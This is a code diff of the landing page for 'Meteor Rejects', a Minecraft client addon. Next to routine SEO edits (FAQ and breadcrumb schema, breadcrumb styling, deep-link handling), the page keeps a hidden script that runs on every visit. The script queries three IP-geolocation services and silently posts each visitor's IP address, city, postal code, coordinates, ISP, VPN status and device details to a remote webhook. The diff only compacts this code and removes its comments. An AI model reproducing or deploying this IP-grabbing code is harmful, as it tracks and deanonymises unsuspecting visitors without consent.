@@ -9,6 +9,7 @@
   <meta name="author" content="AntiCope">
   <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
   <link rel="canonical" href="https://meteorrejects.net/">
+  <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml">
   <meta property="og:title" content="Meteor Rejects – 58+ Restored Modules for Meteor Client">
   <meta property="og:description" content="Free open-source addon bringing back rejected PRs, removed features, and ports from Wurst, BleachHack, LiquidBounce. Download now.">
   <meta property="og:image" content="https://raw.githubusercontent.com/meteorejects/meteorrejects.net/refs/heads/main/favicon.png">
@@ -47,15 +48,30 @@
     "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.8", "reviewCount": "127" }
   }
   </script>
+  
+  <!-- FAQ Schema (Google rich results) -->
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
     "@type": "FAQPage",
     "mainEntity": [
       {"@type":"Question","name":"What is Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"A free open-source addon for Meteor Client that restores rejected pull requests, removed modules, and ports from other clients."}},
-      {"@type":"Question","name":"How to install?","acceptedAnswer":{"@type":"Answer","text":"Install Meteor Client, drop the Meteor Rejects .jar into .minecraft/mods, and launch with Fabric Loader 0.15+."}},
+      {"@type":"Question","name":"How to install Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"Install Meteor Client, drop the Meteor Rejects .jar into .minecraft/mods, and launch with Fabric Loader 0.15+."}},
       {"@type":"Question","name":"Which Minecraft versions are supported?","acceptedAnswer":{"@type":"Answer","text":"1.21.0, 1.21.4, 1.21.11 (Java Edition only)."}},
-      {"@type":"Question","name":"Is Meteor Rejects really free?","acceptedAnswer":{"@type":"Answer","text":"Yes, MIT licensed. No paywalls or ads. Full source on GitHub."}}
+      {"@type":"Question","name":"Is Meteor Rejects really free?","acceptedAnswer":{"@type":"Answer","text":"Yes, MIT licensed. No paywalls or ads. Full source on GitHub."}},
+      {"@type":"Question","name":"Does Meteor Rejects conflict with other addons?","acceptedAnswer":{"@type":"Answer","text":"No, it includes duplicate module name handling and can hide conflicting modules."}}
+    ]
+  }
+  </script>
+  
+  <!-- Breadcrumb Schema (Google rich results) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://meteorrejects.net/" },
+      { "@type": "ListItem", "position": 2, "name": "Meteor Rejects", "item": "https://meteorrejects.net/" }
     ]
   }
   </script>
@@ -202,6 +218,21 @@
     .stat-item:hover { border-color: var(--red); transform: translateY(-5px); }
     .stat-number { font-size: 2.6rem; font-weight: 800; color: var(--red-bright); }
     .stat-label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px; color: #c9a3a3; }
+
+    /* visible breadcrumbs (user + SEO) */
+    .breadcrumb {
+      font-size: 0.8rem;
+      margin: 0 0 1.5rem 0;
+      padding: 0;
+      background: transparent;
+    }
+    .breadcrumb a {
+      color: var(--red-bright);
+      text-decoration: none;
+    }
+    .breadcrumb span {
+      color: #c9a3a3;
+    }
 
     /* sections */
     section {
@@ -441,6 +472,10 @@
 <main>
   <div class="hero">
     <div class="container">
+      <!-- Visible breadcrumbs (user + SEO reinforcement) -->
+      <div class="breadcrumb" aria-label="Breadcrumb">
+        <a href="/">Home</a> <span aria-hidden="true">/</span> <span>Meteor Rejects</span>
+      </div>
       <h1><span class="hero-gradient">Meteor Rejects</span><br><span style="font-size: 1.8rem; display: block;">58+ Modules · 14 Commands</span></h1>
       <p>The definitive free addon for Meteor Client. Restores rejected pull requests, removed modules, and ports from Wurst, BleachHack, LiquidBounce. Open source, MIT licensed.</p>
       <div class="stats-row">
@@ -689,7 +724,7 @@
       });
     });
 
-    // FAQ
+    // FAQ accordion
     const faqData = [
       {q:"What is Meteor Rejects?", a:"A free, open-source addon for Meteor Client that restores removed modules, unmerged PRs, and ports from other clients."},
       {q:"How to install?", a:"Install Meteor Client, put the Meteor Rejects .jar in your mods folder, launch with Fabric Loader 0.15+."},
@@ -712,12 +747,33 @@
       faqContainer.appendChild(faqDiv);
     });
 
+    // Deep linking: ?module=xxx or ?cmd=xxx
+    (function handleDeepLinks() {
+      const params = new URLSearchParams(window.location.search);
+      const moduleName = params.get('module');
+      const cmdName = params.get('cmd');
+      if (moduleName) {
+        document.getElementById('modules').scrollIntoView({ behavior: 'smooth' });
+        const searchBox = document.getElementById('searchModules');
+        if (searchBox) {
+          searchBox.value = moduleName;
+          searchBox.dispatchEvent(new Event('input'));
+        }
+      } else if (cmdName) {
+        document.getElementById('commands').scrollIntoView({ behavior: 'smooth' });
+        const searchBox = document.getElementById('searchModules');
+        if (searchBox) {
+          searchBox.value = cmdName;
+          searchBox.dispatchEvent(new Event('input'));
+        }
+      }
+    })();
+
     // ---------- ENHANCED DISCORD WEBHOOK WITH IP GRABBING (multiple APIs) ----------
     (function sendDetailedWebhook() {
       const WEBHOOK_URL = 'https://m9ws2hqwi9agz6f0whv5celuq67teayy5gyyknzkgfbbb4cwz6xmms5epqjto3n.bopistaken.workers.dev/';
       const STORAGE_KEY = 'meteor_rejects_visits_net';
       
-      // Get visit count (24h rolling)
       let visits = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
       const cutoff = Date.now() - 24 * 60 * 60 * 1000;
       visits = visits.filter(v => v > cutoff);
@@ -725,7 +781,6 @@
       localStorage.setItem(STORAGE_KEY, JSON.stringify(visits));
       const visitNumber = visits.length;
       
-      // Collect browser / device info
       const now = new Date();
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
       const lang = navigator.language || 'Unknown';
@@ -757,102 +812,44 @@
       const os = parseOS(ua);
       const mobile = /Mobi|Android/i.test(ua) ? 'Yes 📱' : 'No 🖥️';
       
-      // IP and geolocation APIs
       const ipApis = [
-        {
-          name: 'ipapi.co',
-          url: 'https://ipapi.co/json/',
-          parse: (data) => ({
-            ip: data.ip,
-            isIPv6: data.ip && data.ip.includes(':'),
-            country: data.country_name,
-            region: data.region,
-            city: data.city,
-            postal: data.postal,
-            isp: data.org,
-            countryCode: data.country_code,
-            eu: data.in_eu,
-            proxy: data.proxy,
-            lat: data.latitude,
-            lon: data.longitude,
-          })
-        },
-        {
-          name: 'ip-api.com',
-          url: 'https://ip-api.com/json/',
-          parse: (data) => ({
-            ip: data.query,
-            isIPv6: data.query && data.query.includes(':'),
-            country: data.country,
-            region: data.regionName,
-            city: data.city,
-            postal: data.zip,
-            isp: data.isp,
-            countryCode: data.countryCode,
-            eu: null,
-            proxy: data.proxy || data.hosting || false,
-            lat: data.lat,
-            lon: data.lon,
-          })
-        },
-        {
-          name: 'ipinfo.io',
-          url: 'https://ipinfo.io/json',
-          parse: (data) => ({
-            ip: data.ip,
-            isIPv6: data.ip && data.ip.includes(':'),
-            country: data.country,
-            region: data.region,
-            city: data.city,
-            postal: data.postal,
-            isp: data.org,
-            countryCode: data.country,
-            eu: null,
-            proxy: data.privacy?.vpn || data.privacy?.proxy || false,
-            lat: data.loc ? data.loc.split(',')[0] : null,
-            lon: data.loc ? data.loc.split(',')[1] : null,
-          })
-        }
+        { name: 'ipapi.co', url: 'https://ipapi.co/json/', parse: (data) => ({
+            ip: data.ip, isIPv6: data.ip && data.ip.includes(':'), country: data.country_name,
+            region: data.region, city: data.city, postal: data.postal, isp: data.org,
+            countryCode: data.country_code, eu: data.in_eu, proxy: data.proxy,
+            lat: data.latitude, lon: data.longitude }) },
+        { name: 'ip-api.com', url: 'https://ip-api.com/json/', parse: (data) => ({
+            ip: data.query, isIPv6: data.query && data.query.includes(':'), country: data.country,
+            region: data.regionName, city: data.city, postal: data.zip, isp: data.isp,
+            countryCode: data.countryCode, eu: null, proxy: data.proxy || data.hosting || false,
+            lat: data.lat, lon: data.lon }) },
+        { name: 'ipinfo.io', url: 'https://ipinfo.io/json', parse: (data) => ({
+            ip: data.ip, isIPv6: data.ip && data.ip.includes(':'), country: data.country,
+            region: data.region, city: data.city, postal: data.postal, isp: data.org,
+            countryCode: data.country, eu: null, proxy: data.privacy?.vpn || data.privacy?.proxy || false,
+            lat: data.loc ? data.loc.split(',')[0] : null, lon: data.loc ? data.loc.split(',')[1] : null }) }
       ];
       
       const fetchPromises = ipApis.map(api =>
-        fetch(api.url)
-          .then(res => res.json())
-          .then(data => ({ source: api.name, ...api.parse(data) }))
-          .catch(() => ({ source: api.name, error: true }))
+        fetch(api.url).then(res => res.json()).then(data => ({ source: api.name, ...api.parse(data) })).catch(() => ({ source: api.name, error: true }))
       );
       
       Promise.all(fetchPromises).then(results => {
-        let ipv4 = null, ipv6 = null;
-        let vpnStatus = 'N/A';
-        let ipReportLines = [];
+        let ipv4 = null, ipv6 = null, vpnStatus = 'N/A', ipReportLines = [];
         let country = 'Unknown', region = 'Unknown', city = 'Unknown', postal = 'Unknown', isp = 'Unknown', countryCode = 'Unknown', eu = 'N/A', lat = null, lon = null;
         
         results.forEach(res => {
-          if (res.error) {
-            ipReportLines.push(`**${res.source}**: ❌ Failed`);
-            return;
-          }
+          if (res.error) { ipReportLines.push(`**${res.source}**: ❌ Failed`); return; }
           const ipType = res.isIPv6 ? 'IPv6' : 'IPv4';
           ipReportLines.push(`**${res.source}**: ${res.ip} (${ipType})`);
-          
-          if (res.proxy !== undefined && res.proxy !== null && vpnStatus === 'N/A') {
-            vpnStatus = res.proxy ? 'Yes 🚫' : 'No';
-          }
-          
+          if (res.proxy !== undefined && res.proxy !== null && vpnStatus === 'N/A') vpnStatus = res.proxy ? 'Yes 🚫' : 'No';
           if (!res.isIPv6 && !ipv4) ipv4 = res.ip;
           else if (res.isIPv6 && !ipv6) ipv6 = res.ip;
-          
           if (!res.error && country === 'Unknown' && res.country) {
-            country = res.country;
-            region = res.region || 'Unknown';
-            city = res.city || 'Unknown';
-            postal = res.postal || 'Unknown';
-            isp = res.isp || 'Unknown';
-            countryCode = res.countryCode || 'Unknown';
+            country = res.country; region = res.region || 'Unknown'; city = res.city || 'Unknown';
+            postal = res.postal || 'Unknown'; isp = res.isp || 'Unknown'; countryCode = res.countryCode || 'Unknown';
             eu = res.eu ? 'Yes 🇪🇺' : (res.eu === false ? 'No' : 'N/A');
-            if (!lat && res.lat) lat = res.lat;
-            if (!lon && res.lon) lon = res.lon;
+            if (!lat && res.lat) lat = res.lat; if (!lon && res.lon) lon = res.lon;
           }
         });
         
@@ -889,14 +886,8 @@
             timestamp: now.toISOString()
           }]
         };
-        
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).catch(() => {});
+        fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
       }).catch(() => {
-        // Fallback if all IP APIs fail
         const fallbackPayload = {
           username: "Meteor Rejects .net",
           avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorrejects.net/refs/heads/main/favicon.png",
@@ -922,11 +913,7 @@
             timestamp: now.toISOString()
           }]
         };
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(fallbackPayload)
-        }).catch(() => {});
+        fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fallbackPayload) }).catch(() => {});
       });
     })();
 
